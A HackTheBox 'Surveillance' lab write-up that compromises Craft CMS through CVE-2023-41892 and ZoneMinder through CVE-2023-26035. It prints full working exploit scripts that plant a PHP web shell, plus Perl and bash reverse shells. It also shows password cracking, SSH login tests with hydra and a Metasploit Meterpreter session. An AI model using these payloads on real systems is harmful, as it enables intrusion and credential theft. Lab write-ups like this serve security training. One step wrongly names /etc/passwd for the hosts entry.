# HackTheBox Surveillance

We will exploit CVE-2023-41892 in Craft CMS, then try CVE-2023-26035 in ZoneMinder. We will also increase privileges by misconfiguring script permissions.

## Service Overview

First, let's scan the 10.10.11.245 machine for open ports using the rustscan utility:

```shell
$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.245 -- -A -sC

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://surveillance.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=12/10%OT=22%CT=%CU=36689%PV=Y%DS=2%DC=T%G=N%TM=65761522%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)
SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)
```

We have standard ports 22 and 80 open, which is typical for HackTheBox Linux machines.

Let's add the host to `/etc/passwd`:

```shell
10.10.11.245 surveillance.htb
```

## Web

On the web version, at first glance, there is nothing interesting. However, if you go down to the bottom, you can see the name and version of the `CMS - Craft CMS 4.4.14`.

```shell
Powered by Craft CMS - https://github.com/craftcms/cms/tree/4.4.14
```

We quickly find that it's vulnerable to [CVE-2023-41892](https://threatprotect.qualys.com/2023/09/25/craft-cms-remote-code-execution-vulnerability-cve-2023-41892/).

We take a little [Proof-of-Concept1](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226) or [Proof-of-Concept2](https://gist.github.com/zhsh9/ae0d6093640aa5c82c534ebee80fa1df).

**[`Proof-of-Concept1`](https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226)**:

```python
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'

    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)

def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    if(len(sys.argv) != 2):
        print("Usage: python CVE-2023-41892.py <url>")
        exit()
    else:
        url = sys.argv[1]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        print("[-] Done, enjoy the shell")
        while True:
            cmd = input("$ ")
            shell(cmd)
```

**[`Proof-of-Concept2`](https://gist.github.com/zhsh9/ae0d6093640aa5c82c534ebee80fa1df)**:

```python
import requests
import re
import sys

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
}

def writePayloadToTempFile(documentRoot):

    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
    }

    files = {
        "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
        <image>
        <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
        <write filename="info:DOCUMENTROOT/cpresources/shell.php">
        </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
    }

    response = requests.post(url, headers=headers, data=data, files=files)

def getTmpUploadDirAndDocumentRoot():
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
    }

    response = requests.post(url, headers=headers, data=data)

    pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
    pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
   
    match1 = re.search(pattern1, response.text, re.DOTALL)
    match2 = re.search(pattern2, response.text, re.DOTALL)
    return match1.group(1), match2.group(1)

def trigerImagick(tmpDir):
    
    data = {
        "action": "conditions/render",
        "configObject[class]": "craft\elements\conditions\ElementCondition",
        "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
    }
    response = requests.post(url, headers=headers, data=data)    

def shell(cmd):
    response = requests.get(url + "/cpresources/shell.php", params={"cmd": cmd})
    match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

    if match:
        extracted_text = match.group(1).strip()
        print(extracted_text)
    else:
        return None
    return extracted_text

if __name__ == "__main__":
    print("[!] Please execute `nc -lvnp <port>` before running this script ...")
    if(len(sys.argv) != 4):
        print("Usage: python CVE-2023-41892.py <url> <local_ip> <local_port>")
        exit()
    else:
        url = sys.argv[1]
        ip = sys.argv[2]
        port = sys.argv[3]
        print("[-] Get temporary folder and document root ...")
        upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
        tmpDir = "/tmp" if "no value" in upload_tmp_dir else upload_tmp_dir
        print("[-] Write payload to temporary file ...")
        try:
            writePayloadToTempFile(documentRoot)
        except requests.exceptions.ConnectionError as e:
            print("[-] Crash the php process and write temp file successfully")

        print("[-] Trigger imagick to write shell ...")
        try:
            trigerImagick(tmpDir)
        except:
            pass

        # Reverse shell
        print("[+] reverse shell is executing ...")
        rshell = f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
        shell(rshell)
```

Download and use the POC from github and analyze the POC. It should be noted that shell.php needs to be generated below, which means using the CSRF principle.
We start up and immediately throw in a normal shell.

```shell
$ python3 CVE-2023-41892.py http://surveillance.htb 10.10.16.49 4444
[!] Please execute `nc -lvnp <port>` before running this script ...
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[+] reverse shell is executing ...

or

$ python3 CVE-2023-41892-POC0.py http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ bash -c "bash -i >& /dev/tcp/10.10.16.49/4444 0<&1"
```
Catch the shell:

```shell
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.49] from (UNKNOWN) [10.10.11.245] 35856
bash: cannot set terminal process group (1098): Inappropriate ioctl for device
bash: no job control in this shell
www-data@surveillance:~/html/craft/web/cpresources$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@surveillance:~/html/craft/web/cpresources$
```

Then search through the directory and find a compressed package of the database in the **`/var/www/html/craft/storage/backups`** directory and found users from server.

```shell
www-data@surveillance:~/html/craft/web/cpresources$ ls /home
ls /home
matthew
zoneminder
www-data@surveillance:~/html/craft/web/cpresources$ cd ../../
cd ../../
www-data@surveillance:~/html/craft$ ls
ls
bootstrap.php
composer.json
composer.lock
config
craft
migrations
storage
templates
vendor
web
www-data@surveillance:~/html/craft$ cd storage
cd storage
www-data@surveillance:~/html/craft/storage$ ls
ls
backups
config-deltas
logs
runtime
www-data@surveillance:~/html/craft/storage$ cd backups
cd backups
www-data@surveillance:~/html/craft/storage/backups$ ls -alh
ls -alh
total 28K
drwxrwxr-x 2 www-data www-data 4.0K Oct 17 20:33 .
drwxr-xr-x 6 www-data www-data 4.0K Oct 11 20:12 ..
-rw-r--r-- 1 root     root      20K Oct 17 20:33 surveillance--2023-10-17-202801--v4.4.14.sql.zip
www-data@surveillance:~/html/craft/storage/backups$
```

Download it locally, then unzip it and open it or read it.

```shell
www-data@surveillance:~/html/craft/storage/backups$ python3 -m http.server 8000
```

```shell
$ wget http://10.10.11.245:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
--2023-12-11 18:16:59--  http://10.10.11.245:8000/surveillance--2023-10-17-202801--v4.4.14.sql.zip
Connecting to 10.10.11.245:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 19918 (19K) [application/zip]
Saving to: ‘surveillance--2023-10-17-202801--v4.4.14.sql.zip’

surveillance--2023-10-17-202801--v4.4.14 100%[=================================================================================>]  19,45K  --.-KB/s    in 0,1s

2023-12-11 18:16:59 (194 KB/s) - ‘surveillance--2023-10-17-202801--v4.4.14.sql.zip’ saved [19918/19918]

$ ls -al surveillance--2023-10-17-202801--v4.4.14.sql.zip
-rw-r--r-- 1 root root 19918 жов 17 23:33 surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

We can found users from server on backup database **`surveillance--2023-10-17-202801--v4.4.14.sql`**:

```shell
$ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep zoneminder
$ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep matthew
INSERT INTO `searchindex` VALUES (1,'email',0,1,' admin surveillance htb '),(1,'firstname',0,1,' matthew '),(1,'fullname',0,1,' matthew b '),(1,'lastname',0,1,' b '),(1,'slug',0,1,''),(1,'username',0,1,' admin '),(2,'slug',0,1,' home '),(2,'title',0,1,' home '),(7,'slug',0,1,' coming soon '),(7,'title',0,1,' coming soon ');
```

We found hash on table `users`:

```shell
$ cat surveillance--2023-10-17-202801--v4.4.14.sql | grep admin

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
set autocommit=0;
INSERT INTO `users` VALUES (1,NULL,1,0,0,0,1,'admin','Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'2023-10-11 18:58:57',NULL,1,NULL,NULL,NULL,0,'2023-10-17 20:27:46','2023-10-11 17:57:16','2023-10-17 20:27:46');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
commit;
```

Use `hashcat` blast directly:

```shell
$ hashcat --identify hash.txt
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

$ hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```

This time I used hydra for verification:

```shell
$ cat users.txt
matthew
zoneminder

$ hydra -t 16 -L users.txt -p starcraft122490 -vV 10.10.11.245 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-11 18:33:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
[DATA] attacking ssh://10.10.11.245:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://matthew@10.10.11.245:22
[INFO] Successful, password authentication is supported by ssh://10.10.11.245:22
[ATTEMPT] target 10.10.11.245 - login "matthew" - pass "starcraft122490" - 1 of 2 [child 0] (0/0)
[ATTEMPT] target 10.10.11.245 - login "zoneminder" - pass "starcraft122490" - 2 of 2 [child 1] (0/0)
[22][ssh] host: 10.10.11.245   login: matthew   password: starcraft122490
[STATUS] attack finished for 10.10.11.245 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

We can directly log in to ssh with user `matthew`, then log in directly:

```shell
$ ssh matthew@10.10.11.245
starcraft122490

matthew@surveillance:~$ ll
total 28
drwxrwx--- 3 matthew matthew 4096 Nov  9 12:45 ./
drwxr-xr-x 4 root    root    4096 Oct 17 11:20 ../
lrwxrwxrwx 1 matthew matthew    9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 matthew matthew 3771 Apr 21  2023 .bashrc
drwx------ 2 matthew matthew 4096 Sep 19 11:26 .cache/
-rw-r--r-- 1 matthew matthew  807 Apr 21  2023 .profile
-rw-r----- 1 root    matthew   33 Dec 11 16:24 user.txt
matthew@surveillance:~$ cat user.txt
f9392e93d03db464e31e3231252fe5de
```

## Privilege escalation

After successfully getting the user flag, enter `sudo -l` and there is no path to escalate privileges. Check that the local port has port 8080.

```shell
matthew@surveillance:~$ sudo -l
[sudo] password for matthew:
Sorry, user matthew may not run sudo on surveillance.
matthew@surveillance:~$ netstat -tunlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

The 8080 port of the intranet guesses that there is an intranet website, so the 8080 port is proxied:

```shell
$ ssh -L 8080:127.0.0.1:8080 matthew@10.10.11.245
starcraft122490
```

From the picture, it looks like this is ZoneMinder CMS. There is a [`POC`](https://sploitus.com/exploit?id=1337DAY-ID-39149&utm_source=rss&utm_medium=rss).

This is a module vulnerability of msf. We can use this module to perform getshell in msf: `exploit/unix/webapp/zoneminder_snapshots`.

```shell
$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/unix/webapp/zoneminder_snapshots
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> options

Module options (exploit/unix/webapp/zoneminder_snapshots):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /zm/             yes       The ZoneMinder path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all
                                        addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      FWsszbVCUrSU     no        Name to use on remote system when storing payload; cannot contain spaces.
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces.
   LHOST                                yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   nix Command



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set RPORT 8080
RPORT => 8080
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set SRVPORT 8081
SRVPORT => 8081
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> run

[-] Msf::OptionValidateError The following options failed to validate: LHOST
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set LHOST tun0
LHOST => 10.10.16.49
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> run

[*] Started reverse TCP handler on 10.10.16.49:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. Check TARGETURI - unexpected HTTP response code: 404 "set ForceExploit true" to override check result.
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set AutoCheck false
AutoCheck => false
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> run

[*] Started reverse TCP handler on 10.10.16.49:4444
[!] AutoCheck is disabled, proceeding with exploitation
[*] Fetching CSRF Token
[-] Exploit aborted due to failure: unexpected-reply: Unable to fetch token.
[*] Exploit completed, but no session was created.
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> set TARGETURI /
TARGETURI => /
[msf](Jobs:0 Agents:0) exploit(unix/webapp/zoneminder_snapshots) >> run

[*] Started reverse TCP handler on 10.10.16.49:4444
[!] AutoCheck is disabled, proceeding with exploitation
[*] Fetching CSRF Token
[+] Got Token: key:d2721f7f649cc0d5f223d5ed3f56326662f2f756,1702313436
[*] Executing nix Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending payload
[*] Sending stage (3045380 bytes) to 10.10.11.245
[*] Meterpreter session 1 opened (10.10.16.49:4444 -> 10.10.11.245:38846) at 2023-12-11 18:50:49 +0200
[+] Payload sent

(Meterpreter 1)(/usr/share/zoneminder/www) > ls
Listing: /usr/share/zoneminder/www
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  ajax
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  api
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  css
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  fonts
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  graphics
040755/rwxr-xr-x  4096  dir   2023-10-17 15:59:03 +0300  includes
100644/rw-r--r--  9294  fil   2022-11-18 21:21:30 +0200  index.php
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  js
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  lang
100644/rw-r--r--  29    fil   2022-11-18 21:21:30 +0200  robots.txt
040755/rwxr-xr-x  4096  dir   2023-10-17 13:53:07 +0300  skins
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  vendor
040755/rwxr-xr-x  4096  dir   2023-10-17 13:57:02 +0300  views

(Meterpreter 1)(/usr/share/zoneminder/www) >

```

Successfully obtained the `zoneminder` user, enter `sudo -l` to view the privilege escalation information:

```shell
(Meterpreter 1)(/usr/share/zoneminder/www) > shell
Process 2569 created.
Channel 1 created.

id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
```

From the above, it looks like the pl file in `/usr/bin`. If you go in, you can see a lot of `pl files`. You can see that there is a `zmupdate.pl` file inside, and then audit it

**`/usr/bin/zmdc.pl`**

```shell
ls -al zm*
-rwxr-xr-x 1 root root 788096 Nov 23  2022 zm_rtsp_server
-rwxr-xr-x 1 root root  43027 Nov 23  2022 zmaudit.pl
-rwxr-xr-x 1 root root 731280 Nov 23  2022 zmc
-rwxr-xr-x 1 root root  12939 Nov 23  2022 zmcamtool.pl
-rwxr-xr-x 1 root root   6043 Nov 23  2022 zmcontrol.pl
-rwxr-xr-x 1 root root  26232 Nov 23  2022 zmdc.pl
-rwxr-xr-x 1 root root  35206 Nov 23  2022 zmfilter.pl
-rwxr-xr-x 1 root root   5640 Nov 23  2022 zmonvif-probe.pl
-rwxr-xr-x 1 root root  19386 Nov 23  2022 zmonvif-trigger.pl
-rwxr-xr-x 1 root root   1842 Sep  5  2022 zmore
-rwxr-xr-x 1 root root  13994 Nov 23  2022 zmpkg.pl
-rwxr-xr-x 1 root root  17492 Nov 23  2022 zmrecover.pl
-rwxr-xr-x 1 root root   4815 Nov 23  2022 zmstats.pl
-rwxr-xr-x 1 root root   2133 Nov 23  2022 zmsystemctl.pl
-rwxr-xr-x 1 root root  13111 Nov 23  2022 zmtelemetry.pl
-rwxr-xr-x 1 root root   5340 Nov 23  2022 zmtrack.pl
-rwxr-xr-x 1 root root  18482 Nov 23  2022 zmtrigger.pl
-rwxr-xr-x 1 root root 690720 Nov 23  2022 zmu
-rwxr-xr-x 1 root root  45421 Nov 23  2022 zmupdate.pl
-rwxr-xr-x 1 root root   8205 Nov 23  2022 zmvideo.pl
-rwxr-xr-x 1 root root   7022 Nov 23  2022 zmwatch.pl
-rwxr-xr-x 1 root root  19655 Nov 23  2022 zmx10.pl

cat /usr/bin/zmupdate.pl

#!/usr/bin/perl -wT
#
# ==========================================================================
#
# ZoneMinder Update Script, $Date$, $Revision$
# Copyright (C) 2001-2008 Philip Coombes
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# ==========================================================================

=head1 NAME

zmupdate.pl - check and upgrade ZoneMinder database

=head1 SYNOPSIS

zmupdate.pl -c,--check | -f,--freshen | -v<version>,--version=<version> [-u <dbuser> -p <dbpass>]

=head1 DESCRIPTION

This script just checks what the most recent release of ZoneMinder is
at the the moment. It will eventually be responsible for applying and
configuring upgrades etc, including on the fly upgrades.

=head1 OPTIONS

-c, --check                      - Check for updated versions of ZoneMinder
-f, --freshen                    - Freshen the configuration in the database. Equivalent of old zmconfig.pl -noi
--migrate-events                 - Update database structures as per USE_DEEP_STORAGE setting.
-v <version>, --version=<version> - Force upgrade to the current version from <version>
-u <dbuser>, --user=<dbuser>      - Alternate DB user with privileges to alter DB
-p <dbpass>, --pass=<dbpass>      - Password of alternate DB user with privileges to alter DB
-s, --super                      - Use system maintenance account on debian based systems instead of unprivileged account
-d <dir>, --dir=<dir>              - Directory containing update files if not in default build location
-interactive                     - interact with the user
-nointeractive                   - do not interact with the user

=cut
use strict;
use bytes;
use version;
use Crypt::Eksblowfish::Bcrypt;
use Data::Entropy::Algorithms qw(rand_bits);

# ==========================================================================
#
# These are the elements you can edit to suit your installation
#
# ==========================================================================

use constant CHECK_INTERVAL => (1*24*60*60); # Interval between version checks

# ==========================================================================
#
# Don't change anything below here
#
# ==========================================================================

# Include from system perl paths only
use ZoneMinder::Base qw(:all);
use ZoneMinder::Config qw(:all);
use ZoneMinder::Logger qw(:all);
use ZoneMinder::General qw(:all);
use ZoneMinder::Database qw(:all);
use POSIX;
use DBI;
use Getopt::Long;
use autouse 'Pod::Usage'=>qw(pod2usage);
use autouse 'Data::Dumper'=>qw(Dumper);

use constant EVENT_PATH => ($Config{ZM_DIR_EVENTS}=~m|/|)?$Config{ZM_DIR_EVENTS}:($Config{ZM_PATH_WEB}.'/'.$Config{ZM_DIR_EVENTS});

$| = 1;

$ENV{PATH}  = '/bin:/usr/bin:/usr/local/bin';
$ENV{SHELL} = '/bin/sh' if exists $ENV{SHELL};
delete @ENV{qw(IFS CDPATH ENV BASH_ENV)};

my $web_uid = (getpwnam( $Config{ZM_WEB_USER} ))[2];
my $use_log = (($> == 0) || ($> == $web_uid));

logInit( toFile=>$use_log?DEBUG:NOLOG );
logSetSignal();

my $interactive = 1;
my $check = 0;
my $freshen = 0;
my $rename = 0;
my $zoneFix = 0;
my $migrateEvents = 0;
my $version = '';
my $dbUser = $Config{ZM_DB_USER};
